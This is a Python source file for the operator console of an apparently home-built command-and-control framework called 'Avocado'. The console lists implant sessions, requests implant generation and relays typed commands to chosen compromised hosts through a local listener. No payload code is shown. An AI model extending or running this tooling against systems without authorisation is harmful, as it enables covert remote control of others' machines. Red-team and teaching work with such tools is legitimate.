#!/usr/bin/env python3
import threading
from listener.listener import Listener
from queue import Queue

class Client:
    sessions = []

    def __init__(self):
        # TODO prompt the user to enter host/port instead
        hostname = "127.0.0.1"
        port = 12345

        implantq = Queue()
        session_outputq = Queue()

        listener = Listener(hostname, port, session_outputq, implantq)

        # output_received is a workaround for i/o issue
        # i.e. the server response overwrites the user input prompt
        output_received = threading.Event()  
        output_received.set()  

        threading.Thread(target=self.implantHandler, args=(implantq,)).start()
        threading.Thread(target=self.sessionOutputHandler, args=(session_outputq, output_received)).start()
        threading.Thread(target=self.inputHandler, args=(listener, output_received, "Avocado")).start()

    # handle new implants
    def implantHandler(self, implantq):
        while True:
            new_implant = implantq.get()

            if new_implant:
                self.sessions.append(new_implant.id)

            else:
                break

    # prints output messages received from the server
    def sessionOutputHandler(self, session_outputq, output_received):
        while True:
            output = session_outputq.get()

            if not output:
                break

            else:
                print(output[0])

            output_received.set() 

    def inputHandler(self, listener, output_received, title, session_id=None):
        while True:
            output_received.wait()

            msg = input(f"[{title}] > ")

            if not msg:
                continue

            elif (session_id):
                listener.sendSession(msg, session_id)
                output_received.clear()  

            else:
                command = msg.split()

                if command[0] == "sessions":
                    for s in self.sessions:
                        print(s)

                elif command[0] == "generate":
                    listener.send("generate")

                elif command[0] == "use":
                    if command[1] not in self.sessions:
                        print (b"Session doesn't exist")

                    if len(command) == 2:
                        self.inputHandler(listener, output_received, command[1], command[1]) 

                    else:
                        print(b"Usage: use <session>")


            if msg.lower() == "exit":
                print(f"[+]{title} Terminated")

                if title=="Avocado":
                    listener.terminate()

                break


if __name__ == "__main__":
    Client()
